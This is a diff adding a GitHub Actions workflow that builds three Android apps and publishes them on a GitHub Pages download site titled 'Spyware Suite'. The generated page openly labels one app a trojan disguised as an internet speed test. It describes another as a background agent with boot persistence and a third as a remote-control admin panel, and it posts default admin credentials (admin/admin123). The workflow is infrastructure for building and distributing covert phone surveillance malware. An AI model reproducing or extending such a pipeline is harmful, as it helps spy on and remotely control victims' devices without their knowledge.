@@ -1,0 +1,291 @@
+name: Android CI
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+jobs:
+  setup:
+    name: Setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+        with:
+          api-level: 34
+          ndk-version: r27c
+      - name: Cache Gradle
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
+    outputs:
+      cache-hit: ${{ steps.cache.outputs.cache-hit }}
+
+  build_agent:
+    name: Build Agent
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+        with:
+          api-level: 34
+          ndk-version: r27c
+      - name: Cache Gradle
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
+      - name: Build Agent Debug
+        run: gradle :agent:assembleDebug
+      - name: Build Agent Release
+        run: gradle :agent:assembleRelease
+      - name: Upload Agent Debug APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: agent-debug
+          path: agent/build/outputs/apk/debug/*.apk
+          retention-days: 7
+      - name: Upload Agent Release APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: agent-release
+          path: agent/build/outputs/apk/release/*.apk
+          retention-days: 30
+
+  build_admin:
+    name: Build Admin
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+        with:
+          api-level: 34
+          ndk-version: r27c
+      - name: Cache Gradle
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
+      - name: Build Admin Debug
+        run: gradle :admin:assembleDebug
+      - name: Build Admin Release
+        run: gradle :admin:assembleRelease
+      - name: Upload Admin Debug APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: admin-debug
+          path: admin/build/outputs/apk/debug/*.apk
+          retention-days: 7
+      - name: Upload Admin Release APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: admin-release
+          path: admin/build/outputs/apk/release/*.apk
+          retention-days: 30
+
+  build_speedmon:
+    name: Build Speedmon
+    needs: setup
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+        with:
+          api-level: 34
+          ndk-version: r27c
+      - name: Cache Gradle
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
+      - name: Build Speedmon Debug
+        run: gradle :speedmon:assembleDebug
+      - name: Build Speedmon Release
+        run: gradle :speedmon:assembleRelease
+      - name: Upload Speedmon Debug APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: speedmon-debug
+          path: speedmon/build/outputs/apk/debug/*.apk
+          retention-days: 7
+      - name: Upload Speedmon Release APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: speedmon-release
+          path: speedmon/build/outputs/apk/release/*.apk
+          retention-days: 30
+
+  package:
+    name: Package Release
+    needs: [build_agent, build_admin, build_speedmon]
+    runs-on: ubuntu-latest
+    steps:
+      - name: Download Agent Debug
+        uses: actions/download-artifact@v4
+        with:
+          name: agent-debug
+          path: release/
+      - name: Download Agent Release
+        uses: actions/download-artifact@v4
+        with:
+          name: agent-release
+          path: release/
+      - name: Download Admin Debug
+        uses: actions/download-artifact@v4
+        with:
+          name: admin-debug
+          path: release/
+      - name: Download Admin Release
+        uses: actions/download-artifact@v4
+        with:
+          name: admin-release
+          path: release/
+      - name: Download Speedmon Debug
+        uses: actions/download-artifact@v4
+        with:
+          name: speedmon-debug
+          path: release/
+      - name: Download Speedmon Release
+        uses: actions/download-artifact@v4
+        with:
+          name: speedmon-release
+          path: release/
+      - name: Rename and Organize APKs
+        run: |
+          cd release
+          mv *.apk system-monitor-agent-debug.apk 2>/dev/null || true
+          mv *.apk spyadmin-admin-debug.apk 2>/dev/null || true
+          mv *.apk speedmon-user-debug.apk 2>/dev/null || true
+          # Find and rename properly
+          for f in *.apk; do
+            if [[ "$f" == *agent*debug* ]]; then mv "$f" system-monitor-agent-debug.apk; fi
+            if [[ "$f" == *agent*release* ]] || [[ "$f" == *agent*.apk && ! "$f" == *debug* ]]; then mv "$f" system-monitor-agent.apk; fi
+            if [[ "$f" == *admin*debug* ]]; then mv "$f" spyadmin-admin-debug.apk; fi
+            if [[ "$f" == *admin*release* ]] || [[ "$f" == *admin*.apk && ! "$f" == *debug* ]]; then mv "$f" spyadmin-admin.apk; fi
+            if [[ "$f" == *speedmon*debug* ]]; then mv "$f" speedmon-user-debug.apk; fi
+            if [[ "$f" == *speedmon*release* ]] || [[ "$f" == *speedmon*.apk && ! "$f" == *debug* ]]; then mv "$f" speedmon-user.apk; fi
+          done
+          sha256sum *.apk > SHA256SUMS.txt
+          cat SHA256SUMS.txt
+      - name: Upload Release Package
+        uses: actions/upload-artifact@v4
+        with:
+          name: spyware-suite-release
+          path: release/
+          retention-days: 30
+
+  deploy_pages:
+    name: Deploy to GitHub Pages
+    needs: package
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    permissions:
+      pages: write
+      id-token: write
+    steps:
+      - name: Download Release Package
+        uses: actions/download-artifact@v4
+        with:
+          name: spyware-suite-release
+          path: public/
+      - name: Create index.html
+        run: |
+          cat > public/index.html << 'HTMLEOF'
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>Spyware Suite - APK Downloads</title>
+            <style>
+              body { font-family: monospace; max-width: 900px; margin: 50px auto; padding: 20px; background: #0a0a0a; color: #0f0; }
+              h1 { color: #0f0; border-bottom: 1px solid #0f0; padding-bottom: 10px; }
+              .apk { margin: 20px 0; padding: 15px; border: 1px solid #0f0; }
+              .apk a { color: #0f0; text-decoration: none; font-weight: bold; }
+              .apk a:hover { text-decoration: underline; }
+              .meta { color: #888; font-size: 0.9em; }
+              .info { background: #1a1a1a; padding: 15px; border: 1px solid #0f0; margin: 20px 0; }
+              .cred { background: #1a1a1a; padding: 15px; border: 1px solid #f00; margin: 20px 0; color: #f88; }
+              .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; }
+            </style>
+          </head>
+          <body>
+            <h1>Spyware Suite — Built $(date -u)</h1>
+            <div class="cred">
+              <strong>Admin Panel Credentials:</strong><br>
+              Username: admin<br>
+              Password: admin123
+            </div>
+            <div class="grid">
+              <div class="apk">
+                <a href="speedmon-user.apk">📱 speedmon-user.apk</a> — Internet Speed Meter (Trojan)
+                <div class="meta">Package: com.speedmon | Disguised as network speed test</div>
+              </div>
+              <div class="apk">
+                <a href="spyadmin-admin.apk">🛠 spyadmin-admin.apk</a> — Admin Control Panel
+                <div class="meta">Package: com.spyadmin | Full remote control interface</div>
+              </div>
+              <div class="apk">
+                <a href="system-monitor-agent.apk">🕷 system-monitor-agent.apk</a> — Background Agent
+                <div class="meta">Package: com.system.monitor | 14 capabilities, boot persistence</div>
+              </div>
+            </div>
+            <div class="meta">SHA256 checksums in <a href="SHA256SUMS.txt">SHA256SUMS.txt</a></div>
+          </body>
+          </html>
+          HTMLEOF
+      - name: Setup Pages
+        uses: actions/configure-pages@v5
+      - name: Upload Pages Artifact
+        uses: actions/upload-pages-artifact@v3
+        with:
+          path: public/
+      - name: Deploy to GitHub Pages
+        id: deployment
+        uses: actions/deploy-pages@v4
